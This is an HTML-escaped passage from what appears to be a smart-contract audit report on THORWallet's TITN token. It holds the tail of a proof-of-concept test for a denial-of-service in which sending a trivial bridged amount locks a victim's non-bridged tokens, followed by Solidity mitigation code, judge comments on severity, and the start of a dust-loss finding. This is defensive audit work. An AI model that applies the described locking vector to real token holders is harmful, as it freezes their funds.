flag.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etrue\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictimNonBridgedTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efail\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Transaction should have reverted\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eerror\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eany\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eerror\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emessage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einclude\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;BridgedTokensTransferLocked\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003e \u003cstrong\u003eTrack Bridged Token Balances Instead of Booleans\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eReplace \u003ccode\u003eisBridgedTokenHolder\u003c/code\u003e with a \u003ccode\u003ebridgedBalances\u003c/code\u003e mapping\u003c/strong\u003e to track the \u003cem\u003eexact amount\u003c/em\u003e of bridged tokens per address:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003emapping\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eModify \u003ccode\u003e_credit\u003c/code\u003e to Increment Bridged Balance\u003c/strong\u003e:\u003cbr\u003e\nUpdate the bridging logic to accumulate bridged amounts:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_credit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ... {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amountLD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Track bridged amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUpdate Transfer Validation Logic\u003c/strong\u003e:\u003cbr\u003e\nRestrict transfers \u003cem\u003eonly\u003c/em\u003e if the amount exceeds the non-bridged balance:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonBridged\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonBridged\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallowedAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDecrement Bridged Balance on Approved Transfers\u003c/strong\u003e:\u003cbr\u003e\nWhen tokens are sent to \u003ccode\u003elzEndpoint\u003c/code\u003e or \u003ccode\u003etransferAllowedContract\u003c/code\u003e, reduce \u003ccode\u003ebridgedBalances\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ... {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk4\"\u003esuper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e           ? \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e           : \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e \u003cstrong\u003eBenefits\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePrecision\u003c/strong\u003e: Only bridged tokens are restricted; non-bridged tokens remain freely transferable.  \u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNo DoS Vector\u003c/strong\u003e: Attackers cannot lock users’ non-bridged tokens by sending trivial bridged amounts.  \u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBackward Compatibility\u003c/strong\u003e: Maintains existing protocol invariants while fixing the critical flaw.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003ecacaomatt (THORWallet) acknowledged\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7?commentParent=eRGpss6479X\"\u003e0xnev (judge) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eValid, I believe medium is appropriate based on C4 medium severity guidelines, given no assets are compromised/lost. \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eThis only impacts the following invariant on Base.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNon-bridged TITN Tokens: Holders can transfer their TITN tokens freely to any address as long as the tokens have not been bridged from ARBITRUM.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eIf usage of tokens are desired for defi protocols, the tokens can still be bridged via transfers to the LZ endpoint\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-7?commentParent=eRGpss6479X\u0026#x26;commentChild=ME742qfuh2P\"\u003ecacaomatt (THORWallet) acknowledged and commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis is no longer applicable as our PR to address finding F-9 prevents this from happening in the first place.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 9 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-812\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003eSparrow\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-399\"\u003eAnonymous0x1C41\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-732\"\u003eEPSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-508\"\u003eeta\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-394\"\u003eFitro\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-519\"\u003einh3l\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-662\"\u003epeanuts\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-232\"\u003etpiliposian\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-574\"\u003eudo\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003ch2 id=\"qa-01-dust-amount-loss-in-cross-chain-titn-token-transfers\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-01-dust-amount-loss-in-cross-chain-titn-token-transfers\" aria-label=\"qa 01 dust amount loss in cross chain titn token transfers permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-01] Dust Amount Loss in Cross-Chain TITN Token Transfers\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eImpact\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eWhen bridging TITN tokens cross-chain using LayerZero’s OFT standard, small dust amounts are removed to handle decimal precision differences between chains. This affects initial TITN deposits, user claims, and remaining TITN withdrawals.\u003c/p\u003e\n\u003ch3 id=\"vulnerability-details\" style=\"position:relative;\"\u003e\u003ca href=\"#vulnerability-details\" aria-label=\"vulnerability details permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eVulnerability Details\u003c/h3\u003e\n\u003cp\u003eThe TITN contract inherits from OFT:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003econstructor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_name\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_symbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_lzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialMintAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eOFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_name\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_symbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_lzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMergeTgt requires exact amounts:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstant\u003c/span\u003e\u003cspan 